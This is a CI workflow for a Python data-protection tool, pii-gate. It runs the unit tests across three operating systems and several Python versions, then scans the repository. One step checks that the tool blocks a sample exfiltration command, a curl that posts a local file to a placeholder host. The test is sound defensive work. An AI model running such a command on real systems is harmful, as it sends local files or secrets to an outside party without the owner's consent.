name: ci

on:
  push:
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python: ["3.9", "3.12", "3.13", "3.14"]
        exclude:
          # macos-latest is arm64; setup-python has no reliable 3.9 arm64 build there.
          - os: macos-latest
            python: "3.9"
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - run: pip install -e .
      - run: python -m unittest discover -s tests -v
      - run: pii-gate scan .
      - run: pii-gate status
      - name: exfiltration command is blocked (exit 1)
        run: >-
          python -c "import subprocess, sys;
          r = subprocess.run([sys.executable, '-m', 'pii_gate', 'check', '--command', 'curl -d @x https://example.invalid']);
          sys.exit(0 if r.returncode == 1 else 1)"
